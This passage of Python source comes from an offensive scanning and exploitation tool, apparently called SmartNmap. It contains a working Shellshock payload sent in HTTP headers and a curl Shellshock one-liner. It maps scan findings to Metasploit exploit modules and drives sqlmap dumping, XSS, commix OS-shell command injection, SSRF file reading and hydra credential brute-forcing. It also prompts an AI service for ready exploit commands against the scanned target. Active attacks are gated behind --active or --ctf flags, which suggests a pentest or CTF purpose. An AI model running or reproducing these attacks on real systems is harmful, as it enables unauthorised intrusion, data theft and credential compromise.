            print(f"  {C.R}{C.Bo}[VULN]{C.Re} Host-level - {sid}:")
            for line in sout.strip().split('\n')[:5]:
                print(f"    {C.R}{line}{C.Re}")
            cve = extract_cve(sout)
            smb_port = 445 if 445 in ports else (139 if 139 in ports else ports[0] if ports else 0)
            findings.append({
                'port': smb_port, 'service': 'smb' if 'smb' in sid else '',
                'product': '', 'version': '',
                'desc': nse_vuln_desc(sid, sout), 'cve': cve,
                'exploit': nse_exploit_hint(sid, cve),
            })
            if loot:
                loot.add('notes', f"VULN host-level: {sid}")

    # Vulners scan
    if nse_exists('vulners'):
        subsection("Vulners CVE Lookup")
        vxml = outdir / 'phase4_vulners.xml'
        run_nmap(['-p', port_str, '-sV', '--script=vulners',
                  '--script-timeout', '60s', '--host-timeout', '300s',
                  '-Pn', target],
                 vxml, 'Vulners', timeout=360)
        vparsed = parse_xml(vxml)
        for p, svc in vparsed.get('services', {}).items():
            for sid, sout in svc.get('scripts', {}).items():
                if sout.strip() and 'vulners' in sid:
                    good(f"Port {p} CVE findings:")
                    for line in sout.strip().split('\n')[:10]:
                        print(f"    {line}")
                    # Extract top CVE (usually first one listed with highest CVSS)
                    top_cve = extract_top_cve(sout)
                    if top_cve:
                        findings.append({
                            'port': p, 'service': svc.get('service', ''),
                            'product': svc.get('product', ''), 'version': svc.get('version', ''),
                            'desc': f"Vulners: {top_cve['desc']}", 'cve': top_cve['cve'],
                            'exploit': f"See https://vulners.com/cve/{top_cve['cve']}",
                        })
    else:
        warn("vulners.nse not installed - run with --install-scripts")

    # AI analysis of vulns
    if api_key:
        vuln_lines = []
        for p, svc in parsed.get('services', {}).items():
            for sid, sout in svc.get('scripts', {}).items():
                if sout.strip():
                    vuln_lines.append(f"Port {p} [{sid}]: {sout[:300]}")
        if vuln_lines:
            advice = ai_phase_advisor(api_key, "Vulnerability Scan",
                f"Target: {target}\nVuln findings:\n" + '\n'.join(vuln_lines[:20]),
                "Which vulnerabilities are most exploitable? Provide specific metasploit modules, manual exploit commands, or PoC URLs. Prioritize by impact and ease of exploitation.")
            if advice:
                print(f"\n{C.M}  AI Vulnerability Analysis:{C.Re}")
                for line in advice.strip().split('\n'):
                    print(f"  {C.Di}{line}{C.Re}")

    return findings


def check_shellshock(base_url, cgi_paths, timeout=5, max_paths=50):
    """PoC shellshock on each CGI script. Returns list of confirmed-vuln URLs.
    Prioritizes paths that are likely to be actual scripts (Status: 200 first)."""
    import urllib.request
    findings = []
    headers_payload = {
        'User-Agent': '() { :;}; echo; echo "SHOCKED:$(/usr/bin/id 2>/dev/null)"',
        'Referer': '() { :;}; echo; echo "SHOCKED:$(/usr/bin/id 2>/dev/null)"',
    }
    # Prioritize paths with Status 200, filter to executable extensions, dedupe
    prioritized = []
    seen = set()
    for path in cgi_paths:
        if '(Status: 200)' in path:
            prioritized.append(path)
            seen.add(path.split()[0] if path.split() else path)
    for path in cgi_paths:
        if path not in seen and path.split()[0] not in seen:
            prioritized.append(path)
            seen.add(path.split()[0] if path.split() else path)
    for path in prioritized[:max_paths]:
        p = path.split('(')[0].strip().lstrip('/')
        if not p or not p.endswith(('.sh', '.cgi', '.pl', '.py')):
            continue
        test_url = base_url.rstrip('/') + '/' + p
        try:
            req = urllib.request.Request(test_url, headers=headers_payload)
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                body = resp.read().decode('latin1', 'ignore')
                if 'SHOCKED:' in body and 'uid=' in body:
                    findings.append(f"{test_url} - {body.split('SHOCKED:')[1].split(chr(10))[0][:100]}")
        except Exception:
            continue
    return findings


def extract_cve(text):
    """Extract first CVE-YYYY-NNNN from text."""
    m = re.search(r'CVE[-:\s]?(\d{4}[-:]\d{3,7})', text or '', re.I)
    if m:
        return f"CVE-{m.group(1).replace(':','-')}"
    m = re.search(r'(MS\d{2}-\d{3})', text or '', re.I)
    return m.group(1) if m else ''


def extract_top_cve(vulners_text):
    """Parse vulners NSE output - return {'cve': 'CVE-...', 'cvss': float, 'desc': str} with highest CVSS."""
    if not vulners_text:
        return None
    top = None
    for line in vulners_text.split('\n'):
        m = re.search(r'(CVE-\d{4}-\d{3,7})\s+(\d+\.\d+)', line)
        if m:
            cvss = float(m.group(2))
            if not top or cvss > top['cvss']:
                top = {'cve': m.group(1), 'cvss': cvss, 'desc': f"CVSS {cvss}"}
    return top


def nse_vuln_desc(sid, sout):
    """Generate human-readable description from NSE script id + output."""
    nice_names = {
        'smb-vuln-ms17-010': 'MS17-010 EternalBlue SMB RCE',
        'smb-vuln-ms08-067': 'MS08-067 Windows Server Service RCE',
        'smb-vuln-ms10-054': 'MS10-054 SMB Pool Overflow',
        'smb-vuln-ms10-061': 'MS10-061 Print Spooler RCE',
        'smb-vuln-cve-2017-7494': 'SambaCry RCE',
        'smb-double-pulsar-backdoor': 'DoublePulsar SMB backdoor present',
        'ssl-heartbleed': 'Heartbleed (OpenSSL memory leak)',
        'ssl-poodle': 'POODLE (SSLv3 downgrade)',
        'ssl-ccs-injection': 'SSL CCS Injection',
        'ssl-dh-params': 'Weak DH params (LOGJAM)',
        'http-shellshock': 'Shellshock (CVE-2014-6271) in CGI',
        'http-slowloris-check': 'Slowloris DoS susceptible',
        'http-vuln-cve2017-5638': 'Struts2 RCE (CVE-2017-5638)',
        'http-vuln-cve2017-1001000': 'WordPress Content Injection',
        'samba-vuln-cve-2012-1182': 'Samba 3.0-3.6 root RCE (CVE-2012-1182)',
    }
    if sid in nice_names:
        return nice_names[sid]
    # Try first non-empty line from output
    for line in (sout or '').split('\n'):
        line = line.strip(' |_\t')
        if line and 'VULNERABLE' not in line.upper() and len(line) < 120:
            return f"{sid}: {line}"
    return f"NSE {sid} VULNERABLE"


def nse_exploit_hint(sid, cve=''):
    """Generate exploit hint for a given NSE finding."""
    hints = {
        'smb-vuln-ms17-010': 'Metasploit: exploit/windows/smb/ms17_010_eternalblue',
        'smb-vuln-ms08-067': 'Metasploit: exploit/windows/smb/ms08_067_netapi',
        'smb-vuln-ms10-054': 'Metasploit: auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow',
        'smb-vuln-cve-2017-7494': 'Metasploit: exploit/linux/samba/is_known_pipename',
        'smb-double-pulsar-backdoor': 'Metasploit: exploit/windows/smb/doublepulsar_rce',
        'ssl-heartbleed': 'Metasploit: auxiliary/scanner/ssl/openssl_heartbleed',
        'http-shellshock': 'curl: curl -A "() { :;}; /bin/bash -c \'id\'" TARGET/cgi-bin/PATH',
        'http-vuln-cve2017-5638': 'Metasploit: exploit/multi/http/struts2_content_type_ognl',
    }
    if sid in hints:
        return hints[sid]
    if cve:
        return f"Search: searchsploit {cve} | https://nvd.nist.gov/vuln/detail/{cve}"
    return f"Review NSE output: {sid}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# WEB/VHOST/SSL UTILITIES
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Modern gobuster interesting status codes to treat as hits
HTTP_HIT_CODES = {'200', '204', '301', '302', '307', '401', '403', '405', '418'}

COMMON_WEB_PATHS = [
    'robots.txt', 'sitemap.xml', '.git/HEAD', '.git/config', '.gitignore',
    '.svn/entries', '.hg/store', '.env', '.env.local', '.env.production',
    '.DS_Store', 'crossdomain.xml', 'clientaccesspolicy.xml',
    'wp-login.php', 'wp-admin/', 'wp-config.php.bak', 'wp-json/', 'xmlrpc.php',
    'administrator/', 'admin/', 'admin.php', 'adminer.php', 'phpmyadmin/',
    'server-status', 'server-info', 'info.php', 'phpinfo.php',
    'actuator', 'actuator/env', 'actuator/health', 'manager/html',
    'console', 'api/', 'api/v1/', 'api/v2/', 'api/swagger', 'swagger.json',
    'swagger-ui/', 'swagger-ui.html', 'v2/api-docs', 'openapi.json',
    'CHANGELOG.md', 'README.md', 'license.txt',
    '.well-known/security.txt', '.well-known/openid-configuration',
    'backup/', 'backups/', 'backup.zip', 'backup.tar.gz', 'backup.sql',
    'config.json', 'config.yaml', 'config.yml', 'config.xml',
    'debug/', 'test.php', 'test/', 'temp/', 'tmp/',
]


def fetch_cert_sans(host, port, timeout=5):
    """Extract Subject Alt Names and CN from TLS certificate. Returns list of hostnames."""
    hostnames = set()
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection((host, port), timeout=timeout) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                # Use DER to get full cert (getpeercert(binary_form=True))
                import binascii
                der = ssock.getpeercert(binary_form=True)
                if der:
                    try:
                        # Fall back to parsed cert if available (Py 3.10+)
                        cert = ssock.getpeercert()
                        if cert:
                            for typ, val in cert.get('subject', []):
                                if typ == 'commonName':
                                    hostnames.add(val)
                            for typ, val in cert.get('subjectAltName', []) or []:
                                if typ in ('DNS', 'IP Address'):
                                    hostnames.add(val)
                    except Exception:
                        pass
                    # Parse DER for SAN extension manually using ssl module's wrapper
                    try:
                        pem = ssl.DER_cert_to_PEM_cert(der)
                        # Use openssl if available for robust parsing
                        if shutil.which('openssl'):
                            r = subprocess.run(
                                ['openssl', 'x509', '-noout', '-text'],
                                input=pem, capture_output=True, text=True, timeout=5)
                            for m in re.findall(r'DNS:([^\s,]+)', r.stdout or ''):
                                hostnames.add(m.strip())
                            cn_match = re.search(r'Subject:.*?CN\s*=\s*([^,\n]+)', r.stdout or '')
                            if cn_match:
                                hostnames.add(cn_match.group(1).strip())
                    except Exception:
                        pass
    except Exception as e:
        return []
    # Clean: drop IP-only, normalize
    cleaned = set()
    for h in hostnames:
        h = h.strip().lower().rstrip('.')
        if not h or h.startswith('*.'):
            cleaned.add(h.lstrip('*.'))
        elif re.match(r'^\d+\.\d+\.\d+\.\d+$', h):
            continue
        else:
            cleaned.add(h)
    return sorted(cleaned - {''})


def http_probe(url, host_header=None, method='GET', timeout=5, follow=False):
    """curl-based HTTP probe. Returns dict with code, title, headers, length."""
    if not shutil.which('curl'):
        return None
    args = ['curl', '-sk', '-o', '-', '-w', '\n__SMARTNMAP_META__\n%{http_code}|%{size_download}|%{redirect_url}|%{content_type}',
            '--max-time', str(timeout), '-X', method, url]
    if follow:
        args.insert(1, '-L')
    if host_header:
        args.extend(['-H', f'Host: {host_header}'])
    try:
        r = subprocess.run(args, capture_output=True, text=True, timeout=timeout + 3)
        body, _, meta = (r.stdout or '').rpartition('\n__SMARTNMAP_META__\n')
        if not meta:
            body = r.stdout or ''
            meta = ''
        parts = meta.split('|') if meta else []
        code = parts[0] if len(parts) > 0 else ''
        size = parts[1] if len(parts) > 1 else '0'
        redirect = parts[2] if len(parts) > 2 else ''
        ctype = parts[3] if len(parts) > 3 else ''
        title_m = re.search(r'<title[^>]*>([^<]+)</title>', body, re.I)
        return {
            'code': code,
            'size': int(size) if size.isdigit() else 0,
            'redirect': redirect,
            'content_type': ctype,
            'title': (title_m.group(1).strip() if title_m else '')[:200],
            'body_head': body[:2000],
        }
    except Exception:
        return None


def extract_hostnames_from_services(services, target, outdir):
    """Aggregate hostnames from TLS SANs, HTTP Host redirects, service extras.
    Returns sorted set of hostnames (excluding raw IPs)."""
    hostnames = set()
    for port, svc in services.items():
        # Check TLS SANs
        if svc.get('tunnel') == 'ssl' or port in (443, 8443, 8080, 9443):
            sans = fetch_cert_sans(target, port, timeout=5)
            for h in sans:
                hostnames.add(h)
                (outdir / 'cert_sans.txt').open('a').write(f"{port}: {h}\n")
        # Check HTTP headers for Host/redirect
        if any(x in svc.get('service', '').lower() for x in ['http', 'www']) or port in (80, 8080, 8000, 5000, 8443, 443):
            scheme = 'https' if svc.get('tunnel') == 'ssl' or port in (443, 8443, 9443) else 'http'
            url = f"{scheme}://{target}:{port}/"
            probe = http_probe(url, timeout=5, follow=False)
            if probe:
                # Check redirect Location
                if probe.get('redirect'):
                    m = re.match(r'https?://([^/:]+)', probe['redirect'])
                    if m:
                        hn = m.group(1).lower()
                        if hn and not re.match(r'^\d+\.\d+\.\d+\.\d+$', hn):
                            hostnames.add(hn)
                # Check body for hostnames
                for m in re.finditer(r'https?://([a-z0-9\-\.]+)', probe.get('body_head', '').lower()):
                    h = m.group(1)
                    if not re.match(r'^\d+\.\d+\.\d+\.\d+$', h) and '.' in h and h != target.lower():
                        hostnames.add(h)
    # Clean
    hostnames = {h for h in hostnames if h and '.' in h and
                 not re.match(r'^\d+\.\d+\.\d+\.\d+$', h)}
    return sorted(hostnames)


def resolve_and_update_hosts(target, hostnames, apply=False):
    """Suggest or apply /etc/hosts updates. Returns list of suggested entries."""
    entries = []
    for h in hostnames:
        entries.append(f"{target} {h}")
    if apply and entries and os.geteuid() == 0:
        existing = Path('/etc/hosts').read_text()
        to_add = [e for e in entries if e not in existing]
        if to_add:
            with open('/etc/hosts', 'a') as fh:
                fh.write('\n# SmartNmap discovered hosts\n')
                fh.write('\n'.join(to_add) + '\n')
            good(f"Added {len(to_add)} entries to /etc/hosts")
    return entries


def vhost_bruteforce(target, port, scheme, wordlist, base_host=None, outdir=None, timeout=180):
    """Use ffuf to bruteforce vhosts. Returns list of discovered vhosts."""
    if not shutil.which('ffuf') or not Path(wordlist).exists():
        return []
    url = f"{scheme}://{target}:{port}/"
    # First get baseline response size from random subdomain
    baseline = http_probe(url, host_header=f"nonexistent-{random.randint(10000,99999)}.{base_host or 'invalid.local'}")
    baseline_size = baseline['size'] if baseline else 0
    out_file = outdir / f'ffuf_vhost_{port}.json' if outdir else None
    hostname_pat = f"FUZZ.{base_host}" if base_host else "FUZZ"
    cmd = ['ffuf', '-u', url, '-H', f'Host: {hostname_pat}',
           '-w', wordlist, '-mc', 'all', '-fc', '404',
           '-fs', str(baseline_size), '-t', '50', '-timeout', '5',
           '-s']
    if out_file:
        cmd.extend(['-of', 'json', '-o', str(out_file)])
    info(f"ffuf vhost bruteforce: Host: {hostname_pat} (filter size={baseline_size})")
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        warn("ffuf vhost bruteforce timed out")
        return []
    discovered = []
    if out_file and out_file.exists():
        try:
            data = json.loads(out_file.read_text())
            for res in data.get('results', []):
                host = res.get('host', '').strip() or res.get('input', {}).get('FUZZ', '')
                if host:
                    discovered.append(host)
        except Exception:
            pass
    # Parse silent mode output too
    for line in r.stdout.splitlines():
        line = line.strip()
        if not line or line.startswith(('#', '[')):
            continue
        if base_host and f'.{base_host}' in line:
            discovered.append(line)
        elif line.replace('-', '').replace('_', '').replace('.', '').isalnum():
            discovered.append(line)
    return sorted(set(discovered))


def run_sslscan_or_testssl(target, port, outdir):
    """Run sslscan / testssl.sh for deep TLS analysis. Returns findings."""
    findings = []
    if shutil.which('sslscan'):
        out_file = outdir / f'sslscan_{port}.txt'
        info(f"sslscan {target}:{port}")
        try:
            r = subprocess.run(['sslscan', '--no-colour', f'{target}:{port}'],
                               capture_output=True, text=True, timeout=60)
            out_file.write_text(r.stdout)
            # Parse interesting findings
            for patn, desc, sev in [
                (r'SSLv2\s+enabled', 'SSLv2 enabled (deprecated)', 'high'),
                (r'SSLv3\s+enabled', 'SSLv3 enabled (POODLE)', 'high'),
                (r'TLSv1\.0\s+enabled', 'TLS 1.0 enabled (deprecated)', 'medium'),
                (r'TLSv1\.1\s+enabled', 'TLS 1.1 enabled (deprecated)', 'medium'),
                (r'Heartbleed', 'Heartbleed vulnerability', 'critical'),
                (r'\bRC4\b', 'RC4 cipher supported (weak)', 'medium'),
                (r'\b(NULL|EXPORT|anon|ADH)\b.*cipher', 'Weak cipher suite supported', 'high'),
                (r'Self[\s\-]?signed', 'Self-signed certificate', 'info'),
                (r'expired', 'Expired certificate', 'medium'),
                (r'3DES', '3DES cipher (SWEET32)', 'low'),
            ]:
                if re.search(patn, r.stdout, re.I):
                    findings.append({'desc': desc, 'severity': sev, 'port': port})
        except Exception as e:
            warn(f"sslscan failed: {e}")
    elif shutil.which('testssl.sh') or shutil.which('testssl'):
        binary = shutil.which('testssl.sh') or shutil.which('testssl')
        out_file = outdir / f'testssl_{port}.txt'
        info(f"testssl {target}:{port}")
        try:
            r = subprocess.run([binary, '--color', '0', '--fast', '--quiet',
                                f'{target}:{port}'],
                               capture_output=True, text=True, timeout=180)
            out_file.write_text(r.stdout)
            for patn, desc, sev in [
                (r'VULNERABLE.*Heartbleed', 'Heartbleed', 'critical'),
                (r'VULNERABLE.*POODLE', 'POODLE SSLv3', 'high'),
                (r'VULNERABLE.*CCS', 'OpenSSL CCS Injection', 'high'),
                (r'VULNERABLE.*ROBOT', 'ROBOT', 'high'),
                (r'VULNERABLE.*LOGJAM', 'LOGJAM', 'medium'),
                (r'VULNERABLE.*SWEET32', 'SWEET32', 'low'),
                (r'offered.*SSLv[23]', 'Old SSL version offered', 'high'),
                (r'offered.*TLS 1\.[01]', 'Old TLS version offered', 'medium'),
            ]:
                if re.search(patn, r.stdout, re.I):
                    findings.append({'desc': desc, 'severity': sev, 'port': port})
        except Exception as e:
            warn(f"testssl failed: {e}")
    return findings


def run_nuclei(target_url, outdir, tags=None, severity='critical,high,medium', timeout=300):
    """Run nuclei templates for vuln discovery. Returns list of findings."""
    if not shutil.which('nuclei'):
        return []
    out_file = outdir / f'nuclei_{hashlib.md5(target_url.encode()).hexdigest()[:8]}.jsonl'
    cmd = ['nuclei', '-u', target_url, '-silent', '-json-export', str(out_file),
           '-severity', severity, '-timeout', '10', '-rate-limit', '100',
           '-stats=false', '-disable-update-check']
    if tags:
        cmd.extend(['-tags', ','.join(tags)])
    info(f"nuclei scan: {target_url} (severity={severity})")
    try:
        rc, out = _stream_process(cmd, outdir / f'nuclei_{hashlib.md5(target_url.encode()).hexdigest()[:8]}.log',
                                  timeout, quiet=False, prefix='  [nuclei] ')
    except Exception as e:
        warn(f"nuclei failed: {e}")
        return []
    findings = []
    if out_file.exists():
        try:
            for line in out_file.read_text().splitlines():
                if not line.strip():
                    continue
                try:
                    e = json.loads(line)
                    findings.append({
                        'template': e.get('template-id') or e.get('templateID'),
                        'severity': (e.get('info', {}).get('severity') or 'unknown').lower(),
                        'name': e.get('info', {}).get('name', ''),
                        'matched_at': e.get('matched-at', target_url),
                        'description': e.get('info', {}).get('description', '')[:200],
                    })
                except json.JSONDecodeError:
                    continue
        except Exception:
            pass
    return findings


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# OFFENSIVE TOOL RUNNERS  (crawlers, injection, SSRF, auth/cred, Windows/AD)
# ------------------------------------------------------------------------
# Safe-by-default gating: crawlers / passive enumeration always run; anything
# that sends injection payloads or brute-forces credentials runs only when
# active_enabled(args) is true (--active or --ctf). When gated off, a candidate
# still gets a ready-to-run command recorded via loot.recommend so nothing
# intrusive fires without opt-in.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def active_enabled(args):
    """Injection/brute tools fire only in --active or --ctf mode."""
    return bool(getattr(args, 'active', False) or getattr(args, 'ctf', False))


def _low_intensity(args):
    """Bug-bounty mode keeps active tools gentle even when enabled."""
    return bool(getattr(args, 'bb', False))


def _run(cmd, timeout=120, inp=None):
    """subprocess wrapper: returns (rc, stdout, stderr); never raises."""
    try:
        r = subprocess.run(cmd, capture_output=True, text=True,
                           timeout=timeout, input=inp)
        return r.returncode, r.stdout or '', r.stderr or ''
    except Exception as e:
        return -1, '', str(e)


def _first_path(candidates):
    return next((w for w in candidates if Path(w).exists()), None)


def _is_ip(host):
    return bool(re.match(r'^\d{1,3}(\.\d{1,3}){3}$', host or ''))


def _recommend(loot, cmd, why=''):
    """Record a ready-to-run command for gated/manual follow-up."""
    if loot:
        loot.add('recommend', f"{cmd}    # {why}" if why else cmd)
    print(f"    {C.Cy}[RECOMMEND]{C.Re} {cmd}")


# Default small credential lists (fast, CTF-friendly). Bigger lists via flags.
_DEFAULT_USERLISTS = [
    '/usr/share/seclists/Usernames/top-usernames-shortlist.txt',
    '/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt',
]
_DEFAULT_PASSLISTS = [
    '/usr/share/seclists/Passwords/Common-Credentials/best110.txt',
    '/usr/share/wordlists/seclists/Passwords/Common-Credentials/best110.txt',
    '/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt',
]
_CRAWL_WORDLISTS = [
    '/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt',
    '/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt',
    '/usr/share/seclists/Discovery/Web-Content/common.txt',
]
# Username lists for AD user-enumeration (kerbrute) — bigger than the brute shortlist
_AD_USERLISTS = [
    '/usr/share/seclists/Usernames/Names/names.txt',
    '/usr/share/wordlists/seclists/Usernames/Names/names.txt',
    '/usr/share/seclists/Usernames/top-usernames-shortlist.txt',
]


# ── Web crawl → URL / parameter corpus ────────────────────────────────────
def build_web_corpus(url, port, target, outdir, args, tools, loot=None):
    """Crawl a web service and build a URL + parameter corpus (always passive).
    katana → hakrawler → gospider for active crawl; gau/waybackurls for archive
    URLs (hostname targets only); arjun for hidden parameters. Returns
    {'urls': set, 'params': set(param-bearing URLs)}."""
    if getattr(args, 'no_crawl', False):
        return {'urls': set(), 'params': set()}
    urls, params = set(), set()
    host = args.hostname or target

    if tools.get('katana'):
        info(f"katana crawl {url}")
        _, out, _ = _run(['katana', '-u', url, '-silent', '-jc', '-d', '3',
                          '-c', '15', '-timeout', '10'], timeout=180)
        urls.update(l.strip() for l in out.splitlines() if l.strip().startswith('http'))
    elif tools.get('hakrawler'):
        info(f"hakrawler crawl {url}")
        _, out, _ = _run(['hakrawler', '-d', '3', '-u'], timeout=150, inp=url + '\n')
        urls.update(l.strip() for l in out.splitlines() if l.strip().startswith('http'))
    elif tools.get('gospider'):
        info(f"gospider crawl {url}")
        _, out, _ = _run(['gospider', '-s', url, '-d', '3', '-q', '--no-redirect'], timeout=180)
        for l in out.splitlines():
            m = re.search(r'https?://\S+', l)
            if m:
                urls.add(m.group(0).rstrip(']'))

    if not _is_ip(host):
        if tools.get('gau'):
            info(f"gau archive URLs for {host}")
            _, out, _ = _run(['gau', '--threads', '5', host], timeout=120)
            urls.update(l.strip() for l in out.splitlines() if l.strip().startswith('http'))
        if tools.get('waybackurls'):
            info(f"waybackurls for {host}")
            _, out, _ = _run(['waybackurls', host], timeout=120)
            urls.update(l.strip() for l in out.splitlines() if l.strip().startswith('http'))

    for u in list(urls):
        tail = u.split('?', 1)[1] if '?' in u else ''
        if '=' in tail:
            params.add(u)

    if tools.get('arjun'):
        info("arjun parameter discovery")
        arj_out = outdir / f'arjun_{port}.json'
        endpoints = [url] + list(dict.fromkeys(u.split('?')[0] for u in list(params)[:5]))
        for ep in dict.fromkeys(endpoints):
            _run(['arjun', '-u', ep, '-oJ', str(arj_out), '-t', '10', '--stable'], timeout=120)
            if arj_out.exists():
                try:
                    data = json.loads(arj_out.read_text())
                    for endpoint, meta in (data.items() if isinstance(data, dict) else []):
                        found = meta.get('params', []) if isinstance(meta, dict) else []
                        if found:
                            params.add(f"{endpoint}?" + '&'.join(f'{p}=1' for p in found))
                except Exception:
                    pass

    # Validate liveness with httpx (keeps param URLs even if filtered)
    if tools.get('httpx') and urls:
        raw = outdir / f'crawl_raw_{port}.txt'
        raw.write_text('\n'.join(sorted(urls)))
        _, out, _ = _run(['httpx', '-silent', '-l', str(raw),
                         '-mc', '200,201,204,301,302,307,401,403,405,500'], timeout=150)
        live = {l.strip() for l in out.splitlines() if l.strip().startswith('http')}
        if live:
            urls = live | params

    if urls:
        (outdir / f'crawl_urls_{port}.txt').write_text('\n'.join(sorted(urls)))
        good(f"crawl: {len(urls)} URLs, {len(params)} parameterized")
        if loot:
            for p in sorted(params)[:50]:
                loot.add('urls', f'[param] {p}')
    if params:
        (outdir / f'crawl_params_{port}.txt').write_text('\n'.join(sorted(params)))
    return {'urls': urls, 'params': params}


# ── Injection testing (active-gated) ──────────────────────────────────────
def run_injection_suite(param_urls, outdir, args, tools, loot=None):
    """sqlmap (SQLi), dalfox (XSS), commix (command injection) on parameterized
    URLs. Active-gated: when off, records ready-to-run commands instead."""
    vulns = []
    param_urls = sorted(param_urls)
    if not param_urls:
        return vulns
    targets_file = outdir / 'inj_targets.txt'
    targets_file.write_text('\n'.join(param_urls))
    sample = param_urls[0]

    if not active_enabled(args):
        if shutil.which('sqlmap'):
            _recommend(loot, f"sqlmap -m {targets_file} --batch --random-agent --level=2 --risk=2 --dbs",
                       "SQLi on discovered parameters")
        if shutil.which('dalfox'):
            _recommend(loot, f"dalfox file {targets_file} --skip-bav -o {outdir/'dalfox.txt'}",
                       "reflected/stored XSS")
        if shutil.which('commix'):
            _recommend(loot, f"commix --batch -m {targets_file}", "command injection")
        return vulns

    subsection("Injection Testing (active)")
    low = _low_intensity(args)

    # sqlmap
    if shutil.which('sqlmap'):
        level, risk = ('1', '1') if low else ('2', '2')
        info(f"sqlmap on {len(param_urls)} parameterized URLs (level={level} risk={risk})")
        _, out, _ = _run(['sqlmap', '-m', str(targets_file), '--batch', '--random-agent',
                         f'--level={level}', f'--risk={risk}', '--smart', '--threads=4',
                         '--output-dir', str(outdir / 'sqlmap'), '--flush-session'],
                        timeout=1200 if not low else 600)
        (outdir / 'sqlmap.txt').write_text(out)
        if re.search(r'(is vulnerable|following injection point|Parameter:.*\n.*Type:)', out, re.I):
            for line in out.splitlines():
                if line.strip().startswith('Parameter:'):
                    good(f"  SQLi: {line.strip()}")
                    if loot:
                        loot.add('creds', f'SQLi injectable: {line.strip()}')
            vulns.append({'port': 80, 'service': 'http', 'product': 'web app', 'version': '',
                         'desc': 'SQL injection confirmed by sqlmap', 'cve': '',
                         'exploit': f'sqlmap -m {targets_file} --batch --dbs --dump',
                         'severity': 'critical'})

    # dalfox (XSS)
    if shutil.which('dalfox'):
        info(f"dalfox XSS scan on {len(param_urls)} URLs")
        dfx = outdir / 'dalfox.txt'
        _, out, _ = _run(['dalfox', 'file', str(targets_file), '--skip-bav',
                         '--no-spinner', '--silence', '-o', str(dfx)],
                        timeout=600)
        body = (dfx.read_text() if dfx.exists() else '') + out
        if re.search(r'\[POC\]|\[VULN\]|triggered', body, re.I):
            for line in body.splitlines():
                if '[POC]' in line or '[VULN]' in line:
                    good(f"  XSS: {line.strip()[:200]}")
            vulns.append({'port': 80, 'service': 'http', 'product': 'web app', 'version': '',
                         'desc': 'Cross-site scripting confirmed by dalfox', 'cve': '',
                         'exploit': f'dalfox file {targets_file}', 'severity': 'high'})

    # commix (command injection)
    if shutil.which('commix'):
        info(f"commix command-injection scan on {sample}")
        _, out, _ = _run(['commix', '--batch', '-u', sample,
                         '--output-dir', str(outdir / 'commix')], timeout=600)
        (outdir / 'commix.txt').write_text(out)
        if re.search(r'(is vulnerable to|command injection|the parameter .* is)', out, re.I):
            good("  Command injection confirmed by commix")
            vulns.append({'port': 80, 'service': 'http', 'product': 'web app', 'version': '',
                         'desc': 'OS command injection confirmed by commix', 'cve': '',
                         'exploit': f'commix --batch -u "{sample}" --os-shell',
                         'severity': 'critical'})
    return vulns


# ── SSRF + OOB (active-gated) ──────────────────────────────────────────────
def run_ssrf_suite(param_urls, outdir, args, tools, loot=None):
    """ssrfmap against parameterized requests, using an interactsh OOB canary
    when available. Active-gated. Records ready-to-run commands when off."""
    vulns = []
    candidates = sorted(u for u in param_urls
                        if re.search(r'(url|uri|path|dest|redirect|next|data|reference|site|'
                                     r'html|feed|host|port|to|out|view|dir|show|file|domain|'
                                     r'callback|return|page|proxy|load|image)=',
                                     u, re.I))
    if not candidates:
        return vulns

    if not active_enabled(args):
        if shutil.which('ssrfmap'):
            _recommend(loot,
                       f"ssrfmap -r <request.txt> -p <param> -m readfiles,portscan  # e.g. {candidates[0]}",
                       "SSRF on url-like parameter")
        return vulns

    subsection("SSRF Testing (active)")
    # OOB canary
    oob_domain = ''
    if getattr(args, 'oob', False) and shutil.which('interactsh-client'):
        info("interactsh OOB canary (run 'interactsh-client' in another shell to catch hits)")
        _recommend(loot, "interactsh-client",
                   "start OOB listener, paste its domain as SSRF/RCE canary")

    if not shutil.which('ssrfmap'):
        _recommend(loot, f"ssrfmap on {candidates[0]}", "ssrfmap not installed")
        return vulns

    # ssrfmap needs a raw HTTP request file; synthesize one from a candidate URL.
    from urllib.parse import urlparse
    u = candidates[0]
    pu = urlparse(u)
    param = next((kv.split('=')[0] for kv in pu.query.split('&') if '=' in kv), 'url')
    req = outdir / 'ssrf_request.txt'
    req.write_text(f"GET {pu.path}?{pu.query} HTTP/1.1\r\nHost: {pu.netloc}\r\n"
                   f"User-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n")
    info(f"ssrfmap on param '{param}' of {pu.netloc}")
    modules = 'readfiles,portscan' + (',redis,axfr' if not _low_intensity(args) else '')
    _, out, _ = _run(['ssrfmap', '-r', str(req), '-p', param, '-m', modules],
                    timeout=600)
    (outdir / 'ssrfmap.txt').write_text(out)
    if re.search(r'(200 OK|root:.*:0:0|open port|internal|reachable)', out, re.I):
        good("  SSRF indicators found by ssrfmap")
        vulns.append({'port': 80, 'service': 'http', 'product': 'web app', 'version': '',
                     'desc': f'Possible SSRF via parameter "{param}" (ssrfmap)', 'cve': '',
                     'exploit': f'ssrfmap -r {req} -p {param} -m readfiles,portscan',
                     'severity': 'high'})
    return vulns


# ── Credential attacks (active-gated) ─────────────────────────────────────
_HYDRA_SERVICES = {  # nmap service name -> hydra module
    'ssh': 'ssh', 'ftp': 'ftp', 'telnet': 'telnet', 'smtp': 'smtp',
